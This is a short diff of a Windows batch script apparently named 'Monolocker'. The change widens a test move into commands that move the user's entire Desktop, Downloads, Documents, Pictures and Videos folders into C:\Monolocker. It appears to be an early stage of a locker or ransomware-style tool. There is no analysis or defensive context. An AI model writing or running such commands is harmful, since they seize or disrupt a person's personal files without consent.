@@ -5,7 +5,11 @@ md Monolocker
 pause
 cd C:\
 pause
-move /y %userprofile%\Desktop\test\ C:\Monolocker
+move /y %userprofile%\Desktop\ C:\Monolocker
+move /y %userprofile%\Downloads\ C:\Monolocker
+move /y %userprofile%\Documents\ C:\Monolocker
+move /y %userprofile%\Pictures\ C:\Monolocker
+move /y %userprofile%\Videos\ C:\Monolocker
 pause
 cd %userprofile%\Desktop
 pause
